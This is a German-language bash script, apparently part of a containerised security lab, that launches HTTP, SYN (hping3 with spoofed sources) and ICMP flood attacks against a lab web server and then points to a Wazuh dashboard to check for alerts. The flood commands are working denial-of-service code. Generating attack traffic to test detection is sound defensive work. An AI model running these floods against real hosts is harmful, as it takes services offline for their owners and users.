#!/bin/bash
# Angriffsszenario 4: Denial of Service (DoS)
# Simuliert verschiedene DoS-Angriffe

echo "=== Denial of Service (DoS) Angriff Szenario ==="
echo "Dieser Angriff simuliert DoS-Angriffe"
echo ""

TARGET_HOST="${1:-webserver}"
ATTACKER="${2:-attacker-internet}"
DURATION="${3:-30}"

echo "[+] Starte DoS-Angriff von $ATTACKER gegen $TARGET_HOST für $DURATION Sekunden"

# HTTP Flood
echo "[*] HTTP Flood Angriff..."
sudo docker exec clab-dmz-project-sun-$ATTACKER bash -c "
    timeout $DURATION bash -c '
        while true; do
            for i in {1..100}; do
                curl -s http://$TARGET_HOST/ -o /dev/null &
            done
            sleep 0.1
        done
    ' 2>/dev/null
" &

HTTP_PID=$!

# SYN Flood (benötigt hping3)
echo "[*] Installiere hping3 für SYN Flood..."
sudo docker exec clab-dmz-project-sun-$ATTACKER bash -c "
    if ! command -v hping3 &> /dev/null; then
        apt-get update -qq && apt-get install -y hping3 -qq
    fi
"

echo "[*] SYN Flood Angriff..."
sudo docker exec clab-dmz-project-sun-$ATTACKER \
    timeout $DURATION hping3 -S -p 80 --flood --rand-source $TARGET_HOST 2>/dev/null &

SYN_PID=$!

# ICMP Flood
echo "[*] ICMP Flood Angriff..."
sudo docker exec clab-dmz-project-sun-$ATTACKER \
    timeout $DURATION bash -c "ping -f -s 65500 $TARGET_HOST" 2>/dev/null &

ICMP_PID=$!

echo "[*] Angriffe laufen für $DURATION Sekunden..."
sleep $DURATION

# Warte auf Beendigung
wait $HTTP_PID 2>/dev/null
wait $SYN_PID 2>/dev/null
wait $ICMP_PID 2>/dev/null

echo ""
echo "[+] DoS-Angriff abgeschlossen"
echo "[+] Überprüfe Wazuh Dashboard für Alerts: https://localhost:8443"
echo "[+] Suche nach: 'dos', 'flood', 'high traffic'"
